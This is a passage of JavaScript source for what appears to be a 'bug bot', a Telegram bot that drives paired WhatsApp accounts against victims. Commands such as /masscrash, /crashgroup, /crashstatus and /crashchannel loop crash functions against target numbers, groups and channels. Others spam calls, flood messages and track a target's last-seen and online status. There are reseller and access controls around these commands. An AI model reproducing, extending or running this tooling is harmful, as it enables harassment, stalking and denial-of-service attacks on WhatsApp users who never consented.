          "إما أن الاتصال أُغلق، أو انتهت مهلة الانتظار (15 ثانية).\n" +
          "شغّل `npm run doctor` لمعرفة السبب الدقيق.",
        { parse_mode: "Markdown" }
      );
    }

    if (typeof client.requestPairingCode === "function") {
      const code = await client.requestPairingCode(phone);
      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
      const pairingMessage = await ctx.reply(
        `✅ *Pairing Code Siap!*\n\n📱 *Nomor:* \`${phone}\`\n🔐 *Kode:* \`${code}\`\n\nMasukkan kode ini di aplikasi WhatsApp agar tersambung.`,
        { parse_mode: "Markdown" }
      );

      waClients[userId].pairingMessageId = pairingMessage.message_id;

      setTimeout(async () => {
        try {
          if (waClients[userId]?.status !== "open") {
            await ctx.api.sendMessage(
              userId,
              "⏰ *Pairing Code Expired*\nSilahkan minta ulang dengan `/reqpair`.",
              { parse_mode: "Markdown" }
            );
            if (waClients[userId]) {
              try { await waClients[userId].sock.end(); } catch {}
              delete waClients[userId];
            }
          }
        } catch (e) {
          log.error(`Timeout handler for ${userId}: ${e.message}`);
        }
      }, 60 * 1000);
    } else {
      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
      return ctx.reply("⚠️ Baileys build kamu tidak support pairing API.");
    }
  } catch (err) {
    log.error(`Pairing failed for ${userId}: ${err.message}`);
    await ctx.reply("❌ *Gagal Pairing*\nTerjadi kesalahan tak terduga.", { parse_mode: "Markdown" });
  }
});

// =====================================================================
// COMMAND: /listpair
// =====================================================================

bot.command("listpair", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();

    let result = "📌 *Daftar Sender WhatsApp Terhubung*\n";
    result += "═══════════════════════════════════\n\n";
    let count = 0;

    for (const uid in waClients) {
      const clientData = waClients[uid];
      if (!clientData || clientData?.status !== "open") continue;
      count++;

      try {
        const sock = clientData?.sock;
        const authState = sock?.authState;
        const creds = authState?.creds || {};
        const me = creds?.me || {};
        const userJid = sock?.user?.id || me?.id || "";
        const phoneNumber = userJid.includes("@") ? userJid.split("@")[0] : "Unknown";

        result += `⚡ *SENDER LIST NO. ${count}*` +
          `────────────────────────────────────\n` +
          `👤 *Telegram : ${uid}*\n` +
          `📱 *WhatsApp : \`${phoneNumber}\`*\n` +
          `🔗 *Status : ✅ Aktif*\n\n`;
      } catch (innerErr) {
        result += `⚡ *SENDER LIST NO. ${count}*\n` +
          `👤 *User ID : \`${uid}\`*\n` +
          `🔗 *Status : ✅ Connected (Data partial)*\n\n`;
      }
    }

    if (count === 0) {
      return ctx.reply("ℹ️ *Tidak Ada Sender Aktif*\n\nBelum ada WhatsApp yang terhubung. Gunakan `/reqpair` untuk menambahkan sender baru.", { parse_mode: "Markdown" });
    }

    result += `═══════════════════════════════════\n`;
    result += `📊 *Total Sender Aktif:* ${count}\n`;
    result += `📅 *Check Time:* ${new Date().toLocaleString("id-ID")}`;

    await ctx.reply(result, { parse_mode: "Markdown" });
  } catch (e) {
    log.error(`[LISTPAIR] Critical error: ${e.message}`);
    await ctx.reply("❌ *Terjadi Kesalahan*\n\nGagal membaca data sender.", { parse_mode: "Markdown" });
  }
});

// =====================================================================
// COMMAND: /clearsesi
// =====================================================================

bot.command("clearsesi", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(" ");
    const targetUserId = args[1] || userId;

    const client = waClients[targetUserId];
    if (!client) {
      return ctx.reply("⚠️ Tidak ada sesi WhatsApp aktif untuk user ini.", { parse_mode: "Markdown" });
    }

    if (client.sock?.end) {
      await client.sock.end().catch(() => {});
    }

    delete waClients[targetUserId];
    await deleteSessionForUser(targetUserId);

    await ctx.reply(`✅ Sesi WhatsApp untuk user ${targetUserId} telah dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    log.error(`Failed to clear session for ${userId}: ${err.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat menghapus sesi.", { parse_mode: "Markdown" });
  }
});

// =====================================================================
// COMMAND: /clearsender
// =====================================================================

bot.command("clearsender", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) {
      return ctx.reply(getNoAccessMessage(userId));
    }

    const confirmMsg = await ctx.reply(
      "⚠️ *Peringatan!*\n\nAksi ini akan:\n❌ Menghapus SEMUA session WhatsApp\n❌ Menghapus SEMUA folder session\n✅ Restart bot otomatis\n\nLanjutkan?",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Ya, Hapus Semua", callback_data: "clearsender_confirm" }],
            [{ text: "❌ Batal", callback_data: "clearsender_cancel" }],
          ],
        },
      }
    );
  } catch (err) {
    log.error(`Error in /clearsender for ${userId}: ${err.message}`);
    await ctx.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
  }
});

// =====================================================================
// COMMAND: /masscrash
// =====================================================================

bot.command("masscrash", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const numbers = args.slice(1);
    
    if (numbers.length === 0) {
      return ctx.reply(
        "⚠️ *Format:*\n/masscrash 628xxx 628xxx 628xxx\n\n📌 Minimal 2 nomor",
        { parse_mode: "Markdown" }
      );
    }

    if (numbers.length < 2) {
      return ctx.reply("❌ Minimal 2 nomor untuk masscrash!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply(
        "📵 WhatsApp belum terhubung.\nSilakan pairing dengan:\n/reqpair 628xxxx",
        { parse_mode: "Markdown" }
      );
    }

    const client = clientEntry.sock;
    await ctx.reply(`🦠 Memulai masscrash untuk ${numbers.length} nomor...`);

    for (const num of numbers) {
      const cleanTarget = num.replace(/[^0-9]/g, "");
      if (cleanTarget.length < 10) continue;
      
      const X = `${cleanTarget}@s.whatsapp.net`;
      
      for (let z = 0; z < 20; z++) {
        await hardfix1(client, X);
        await hardfix2(client, X);
        await hardfix3(client, X);
        await audiocall(client, X);
        await sleep(50);
      }
    }

    await ctx.reply(`✅ Masscrash selesai! Target: ${numbers.length} nomor`);
    
  } catch (e) {
    log.error(`MASSCRASH ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat masscrash.");
  }
});
// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 4/7: Lines 1951-2600
// Total: ~4550 Lines
// =====================================================================

// =====================================================================
// COMMAND: /spamcall
// =====================================================================

bot.command("spamcall", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const input = args[1];
    const count = parseInt(args[2]) || 10;
    
    if (!input) {
      return ctx.reply("⚠️ Format: /spamcall 628xxx <jumlah>", { parse_mode: "Markdown" });
    }

    const cleanTarget = input.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) {
      return ctx.reply("❌ Nomor tidak valid!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = `${cleanTarget}@s.whatsapp.net`;
    
    await ctx.reply(`📞 Memulai spam call ke ${cleanTarget} (${count} kali)...`);

    for (let i = 0; i < Math.min(count, 50); i++) {
      await audiocall(client, X);
      await sleep(200);
    }

    await ctx.reply(`✅ Spam call selesai! Target: ${cleanTarget}`);
    
  } catch (e) {
    log.error(`SPAMCALL ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal melakukan spam call.");
  }
});

// =====================================================================
// COMMAND: /floodmsg
// =====================================================================

bot.command("floodmsg", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const input = args[1];
    const count = parseInt(args[2]) || 50;
    const msg = args.slice(3).join(" ") || "Halo";
    
    if (!input) {
      return ctx.reply("⚠️ Format: /floodmsg 628xxx <jumlah> <pesan>", { parse_mode: "Markdown" });
    }

    const cleanTarget = input.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) {
      return ctx.reply("❌ Nomor tidak valid!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = `${cleanTarget}@s.whatsapp.net`;
    
    await ctx.reply(`💬 Memulai flood ke ${cleanTarget} (${count} kali)...`);

    for (let i = 0; i < Math.min(count, 200); i++) {
      await client.sendMessage(X, { text: `${msg} ${i+1}` });
      await sleep(50);
    }

    await ctx.reply(`✅ Flood selesai! Target: ${cleanTarget}`);
    
  } catch (e) {
    log.error(`FLOODMSG ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal melakukan flood.");
  }
});

// =====================================================================
// COMMAND: /crashgroup
// =====================================================================

bot.command("crashgroup", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const groupId = args[1];
    
    if (!groupId) {
      return ctx.reply("⚠️ Format: /crashgroup <group_id>", { parse_mode: "Markdown" });
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = groupId.includes("@g.us") ? groupId : `${groupId}@g.us`;
    
    await ctx.reply(`🦠 Memulai crash group...`);

    for (let z = 0; z < 100; z++) {
      await hardfix1(client, X);
      await hardfix2(client, X);
      await hardfix3(client, X);
      await delayhigh(client, X);
      await sleep(50);
    }

    await ctx.reply(`✅ Crash group selesai!`);
    
  } catch (e) {
    log.error(`CRASHGROUP ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal crash group.");
  }
});

// =====================================================================
// COMMAND: /crashstatus
// =====================================================================

bot.command("crashstatus", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const input = args[1];
    
    if (!input) {
      return ctx.reply("⚠️ Format: /crashstatus 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = input.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) {
      return ctx.reply("❌ Nomor tidak valid!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = `${cleanTarget}@s.whatsapp.net`;
    
    await ctx.reply(`🦠 Memulai crash status...`);

    for (let z = 0; z < 50; z++) {
      await delaybeta(client, X);
      await sleep(100);
    }

    await ctx.reply(`✅ Crash status selesai!`);
    
  } catch (e) {
    log.error(`CRASHSTATUS ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal crash status.");
  }
});

// =====================================================================
// COMMAND: /crashchannel
// =====================================================================

bot.command("crashchannel", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const channelId = args[1];
    
    if (!channelId) {
      return ctx.reply("⚠️ Format: /crashchannel <channel_id>", { parse_mode: "Markdown" });
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    
    await ctx.reply(`🦠 Memulai crash channel...`);

    for (let z = 0; z < 50; z++) {
      await XoipCrash(client, channelId);
      await sleep(100);
    }

    await ctx.reply(`✅ Crash channel selesai!`);
    
  } catch (e) {
    log.error(`CRASHCHANNEL ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal crash channel.");
  }
});

// =====================================================================
// COMMAND: /restart
// =====================================================================

bot.command("restart", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    await ctx.reply("🔄 Restarting bot...");

    // ⚠️ إصلاح: كان يستدعي process.exit(0) مباشرة بعد حذف
    // الإدخالات من waClients — بدون انتظار إغلاق السوكيتات فعليًا.
    // النتيجة: جلسات واتساب تُترك مفتوحة ومفاتيح التشفير ما تُحفظ،
    // فتتلف الجلسة ويضطر المستخدم يعيد الربط من جديد.
    setTimeout(async () => {
      await gracefulShutdown(0);
    }, 1000);
    
  } catch (e) {
    log.error(`RESTART ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal merestart bot.");
  }
});

// =====================================================================
// COMMAND: /shutdown
// =====================================================================

bot.command("shutdown", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    await ctx.reply("🛑 Shutting down bot...");

    setTimeout(async () => {
      await gracefulShutdown(1);
    }, 1000);
    
  } catch (e) {
    log.error(`SHUTDOWN ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mematikan bot.");
  }
});

// =====================================================================
// COMMAND: /status
// =====================================================================

bot.command("status", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const totalMemory = (process.memoryUsage().heapTotal / 1024 / 1024).toFixed(2);
    const sessionCount = Object.keys(waClients).length;
    const users = safeReadJSON("database/users.json", []).length;

    const status = `
📊 *Bot Status*
═══════════════════════════════

🕐 *Uptime:* ${uptime}
💾 *Memory Used:* ${usedMemory} MB
📦 *Total Memory:* ${totalMemory} MB
📱 *Active Sessions:* ${sessionCount}
👥 *Total Users:* ${users}
🔧 *Cooldown:* ${cooldownModule.isCooldownEnabled() ? '✅ Active' : '❌ Inactive'}
🔄 *Free Mode:* ${isFreeMode() ? '✅ On' : '❌ Off'}

📅 *Time:* ${new Date().toLocaleString()}
    `;

    await ctx.reply(status, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`STATUS ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan status.");
  }
});

// =====================================================================
// COMMAND: /stats
// =====================================================================

bot.command("stats", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    const users = safeReadJSON("database/users.json", []);
    const access = safeReadJSON("./storage/access.json", { users: [] });
    const resellers = safeReadJSON("./storage/resellers.json", { users: [] });
    const blacklistData = blacklist;
    const sessionCount = Object.keys(waClients).length;

    const stats = `
📈 *Bot Statistics*
═══════════════════════════════

👥 *Total Users:* ${users.length}
🔑 *Access Users:* ${access.users.length}
🔄 *Resellers:* ${resellers.users.length}
🚫 *Blacklist:* ${blacklistData.length}
📱 *Active Sessions:* ${sessionCount}
📂 *Session Folder:* ${fs.existsSync("./session") ? fs.readdirSync("./session").length : 0}

📅 *Date:* ${new Date().toLocaleString()}
    `;

    await ctx.reply(stats, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`STATS ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan statistik.");
  }
});

// =====================================================================
// COMMAND: /checkbio
// =====================================================================

bot.command("checkbio", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const input = args[1];
    
    if (!input) {
      return ctx.reply("⚠️ Format: /checkbio 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = input.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) {
      return ctx.reply("❌ Nomor tidak valid!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = `${cleanTarget}@s.whatsapp.net`;
    
    const contact = await client.contactQuery(X);
    
    let info = `📱 *Profile Info*\n═══════════════════════════════\n`;
    info += `📌 *Number:* ${cleanTarget}\n`;
    info += `📛 *Name:* ${contact?.name || 'Tidak tersedia'}\n`;
    info += `🖼️ *Status:* ${contact?.status || 'Tidak tersedia'}\n`;
    info += `🕐 *Last Seen:* ${contact?.lastSeen || 'Tidak tersedia'}\n\n`;
    info += `📅 *Time:* ${new Date().toLocaleString()}`;

    await ctx.reply(info, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`CHECKBIO ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan info profil.");
  }
});

// =====================================================================
// COMMAND: /checklast
// =====================================================================

bot.command("checklast", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const input = args[1];
    
    if (!input) {
      return ctx.reply("⚠️ Format: /checklast 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = input.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) {
      return ctx.reply("❌ Nomor tidak valid!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = `${cleanTarget}@s.whatsapp.net`;
    
    const presence = await client.presenceSubscribe(X);
    
    const lastSeen = presence?.lastSeen ? new Date(presence.lastSeen).toLocaleString() : 'Tidak tersedia';
    
    await ctx.reply(`🕐 *Last Seen*\n═══════════════════════════════\n📌 ${cleanTarget}\n🕐 ${lastSeen}`);
    
  } catch (e) {
    log.error(`CHECKLAST ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengecek last seen.");
  }
});

// =====================================================================
// COMMAND: /checkonline
// =====================================================================

bot.command("checkonline", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const args = ctx.message.text.split(" ");
    const input = args[1];
    
    if (!input) {
      return ctx.reply("⚠️ Format: /checkonline 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = input.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) {
      return ctx.reply("❌ Nomor tidak valid!");
    }

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const X = `${cleanTarget}@s.whatsapp.net`;
    
    const presence = await client.presenceSubscribe(X);
    
    if (presence) {
      await ctx.reply(`✅ ${cleanTarget} sedang online!`);
    } else {
      await ctx.reply(`❌ ${cleanTarget} offline.`);
    }
    
  } catch (e) {
    log.error(`CHECKONLINE ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengecek status online.");
  }
});

// =====================================================================
// COMMAND: /getgroups
// =====================================================================

bot.command("getgroups", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    
    const groups = await client.groupFetchAllParticipating();
    const groupList = Object.keys(groups);
    
    let text = `📌 *Groups (${groupList.length})*\n═══════════════════════════════\n`;
    
    for (const gid of groupList.slice(0, 20)) {
      const group = groups[gid];
      text += `📎 ${group.subject}\n`;
      text += `   🆔 ${gid}\n`;
      text += `   👥 ${group.participants?.length || 0} members\n\n`;
    }
    
    if (groupList.length > 20) {
      text += `... dan ${groupList.length - 20} grup lainnya`;
    }

    await ctx.reply(text, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`GETGROUPS ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan daftar grup.");
  }
});

// =====================================================================
// COMMAND: /killall
// =====================================================================

bot.command("killall", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    let count = 0;
    for (const uid in waClients) {
      try {
        if (waClients[uid]?.sock) {
          await waClients[uid].sock.end();
        }
        delete waClients[uid];
        count++;
      } catch (e) {}
    }

    await ctx.reply(`✅ Semua session (${count}) telah dihentikan.`);
    
  } catch (e) {
    log.error(`KILLALL ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal menghentikan session.");
  }
});

// =====================================================================
// COMMAND: /killuser
// =====================================================================

bot.command("killuser", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    const target = args[1];
    
    if (!target) {
      return ctx.reply("⚠️ Format: /killuser <user_id>", { parse_mode: "Markdown" });
    }

    if (waClients[target]) {
      try {
        if (waClients[target]?.sock) {
          await waClients[target].sock.end();
        }
        delete waClients[target];
        await deleteSessionForUser(target);
        await ctx.reply(`✅ Session user ${target} telah dihentikan.`);
      } catch (e) {
        await ctx.reply(`❌ Gagal menghentikan session ${target}.`);
      }
    } else {
      await ctx.reply(`⚠️ Tidak ada session aktif untuk user ${target}.`);
    }
    
  } catch (e) {
    log.error(`KILLUSER ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal menghentikan session user.");
  }
});

// =====================================================================
// COMMAND: /sessioninfo
// =====================================================================

bot.command("sessioninfo", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));

    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 WhatsApp belum terhubung.");
    }

    const client = clientEntry.sock;
    const user = client.user;
    const authState = client.authState;
    const creds = authState?.creds || {};
    const me = creds?.me || {};

    let info = `📱 *Session Info*\n═══════════════════════════════\n`;
    info += `🆔 *JID:* ${user?.id || 'Unknown'}\n`;
    info += `📛 *Name:* ${me?.name || 'Unknown'}\n`;
    info += `📟 *Device:* ${me?.device || 'Unknown'}\n`;
    info += `💻 *Platform:* ${creds?.platform || 'Unknown'}\n`;
    info += `📦 *WA Version:* ${creds?.waVersion || 'Unknown'}\n`;
    info += `🔗 *Status:* ${clientEntry.status || 'Unknown'}\n`;
    info += `📅 *Last Activity:* ${clientEntry.lastActivity ? new Date(clientEntry.lastActivity).toLocaleString() : 'Unknown'}\n`;
    info += `📊 *Message Count:* ${clientEntry.messageCount || 0}`;

    await ctx.reply(info, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`SESSIONINFO ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan info session.");
  }
});

// =====================================================================
// COMMAND: /block
// =====================================================================

bot.command("block", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) {
      return ctx.reply("❌ Hanya owner & reseller!");
    }

    const args = ctx.message.text.split(" ");
    const target = args[1];
    
    if (!target) {
      return ctx.reply("⚠️ Format: /block 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = target.replace(/[^0-9]/g, "");
    if (!blacklist.includes(cleanTarget)) {
      blacklist.push(cleanTarget);
      saveBlacklist();
    }

    await ctx.reply(`✅ ${cleanTarget} telah diblokir.`);
    
  } catch (e) {
    log.error(`BLOCK ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal memblokir nomor.");
  }
});

// =====================================================================
// COMMAND: /unblock
// =====================================================================

bot.command("unblock", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) {
      return ctx.reply("❌ Hanya owner & reseller!");
    }

    const args = ctx.message.text.split(" ");
    const target = args[1];
    
    if (!target) {
      return ctx.reply("⚠️ Format: /unblock 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = target.replace(/[^0-9]/g, "");
    blacklist = blacklist.filter(num => num !== cleanTarget);
    saveBlacklist();

    await ctx.reply(`✅ ${cleanTarget} telah diunblock.`);
    
  } catch (e) {
    log.error(`UNBLOCK ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal unblock nomor.");
  }
});

// =====================================================================
// COMMAND: /blacklist
// =====================================================================

bot.command("blacklist", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) {
      return ctx.reply("❌ Hanya owner & reseller!");
    }

    if (blacklist.length === 0) {
      return ctx.reply("📭 Blacklist kosong.");
    }

    let text = `🚫 *Blacklist (${blacklist.length})*\n═══════════════════════════════\n`;
    blacklist.forEach((num, i) => {
      text += `${i+1}. ${num}\n`;
    });

    await ctx.reply(text, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`BLACKLIST ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan blacklist.");
  }
});

// =====================================================================
// COMMAND: /whitelist
// =====================================================================

bot.command("whitelist", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) {
      return ctx.reply("❌ Hanya owner & reseller!");
    }

    const args = ctx.message.text.split(" ");
    const target = args[1];
    
    if (!target) {
      return ctx.reply("⚠️ Format: /whitelist 628xxx", { parse_mode: "Markdown" });
    }

    const cleanTarget = target.replace(/[^0-9]/g, "");
    if (!whitelist.includes(cleanTarget)) {
      whitelist.push(cleanTarget);
      saveWhitelist();
    }

    await ctx.reply(`✅ ${cleanTarget} telah ditambahkan ke whitelist.`);
    
  } catch (e) {
    log.error(`WHITELIST ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal menambahkan ke whitelist.");
  }
});

// =====================================================================
// COMMAND: /alert
// =====================================================================

bot.command("alert", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    const msg = args.slice(1).join(" ");
    
    if (!msg) {
      return ctx.reply("⚠️ Format: /alert <pesan>", { parse_mode: "Markdown" });
    }

    const users = safeReadJSON("database/users.json", []);
    let ok = 0, fail = 0;

    for (const id of users) {
      try {
        await ctx.api.sendMessage(id, `🔔 *Alert*\n\n${msg}`, { parse_mode: "Markdown" });
        ok++;
      } catch {
        fail++;
      }
    }

    await ctx.reply(`✅ Alert selesai!\n📤 Terkirim: ${ok}\n❌ Gagal: ${fail}`);
    
  } catch (e) {
    log.error(`ALERT ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengirim alert.");
  }
});

// =====================================================================
// COMMAND: /broadcastall
// =====================================================================

bot.command("broadcastall", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    const msg = args.slice(1).join(" ");
    
    if (!msg) {
      return ctx.reply("⚠️ Format: /broadcastall <pesan>", { parse_mode: "Markdown" });
    }

    const users = safeReadJSON("database/users.json", []);
    let ok = 0, fail = 0;

    for (const id of users) {
      try {
        await ctx.api.sendMessage(id, `📢 *Broadcast*\n\n${msg}`, { parse_mode: "Markdown" });
        ok++;
      } catch {
        fail++;
      }
    }

    await ctx.reply(`✅ Broadcast selesai!\n📤 Terkirim: ${ok}\n❌ Gagal: ${fail}`);
    
  } catch (e) {
    log.error(`BROADCASTALL ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengirim broadcast.");
  }
});

// =====================================================================
// COMMAND: /dm
// =====================================================================

bot.command("dm", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) {
      return ctx.reply("❌ Hanya owner & reseller!");
    }

    const args = ctx.message.text.split(" ");
    const target = args[1];
    const msg = args.slice(2).join(" ");
    
    if (!target || !msg) {
      return ctx.reply("⚠️ Format: /dm <user_id> <pesan>", { parse_mode: "Markdown" });
    }

    await ctx.api.sendMessage(target, `📩 *Pesan dari Admin*\n\n${msg}`, { parse_mode: "Markdown" });
    await ctx.reply(`✅ Pesan terkirim ke ${target}`);
    
  } catch (e) {
    log.error(`DM ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengirim DM.");
  }
});
// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 5/7: Lines 2601-3250
// Total: ~4550 Lines
// =====================================================================

// =====================================================================
// COMMAND: /gettoken
// =====================================================================

bot.command("gettoken", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    // 🚫 إصلاح أمني: كان يعرض التوكن كاملًا في المحادثة → تسريب سري.
    // أي شخص يوصل لهذه المحادثة (أو لأي نسخة احتياطية منها) يقدر
    // يتحكم بالبوت بالكامل. الحين يُعرض مموهًا للتحقق فقط.
    const token = config.telegramBotToken || "";
    const masked = token ? token.slice(0, 6) + "••••••" + token.slice(-4) : "(غير مضبوط)";

    await ctx.reply(
      `🔑 *Bot Token (مموّه)*\n\`${masked}\`` +
        "\n\n🚫 لا يُعرض التوكن الكامل في المحادثات لأسباب أمنية.\n" +
        "لتغييره: عدّل TELEGRAM_BOT_TOKEN في ملف .env ثم أعد التشغيل.",
      { parse_mode: "Markdown" }
    );
    
  } catch (e) {
    log.error(`GETTOKEN ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan token.");
  }
});

// =====================================================================
// COMMAND: /settoken
// =====================================================================

bot.command("settoken", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

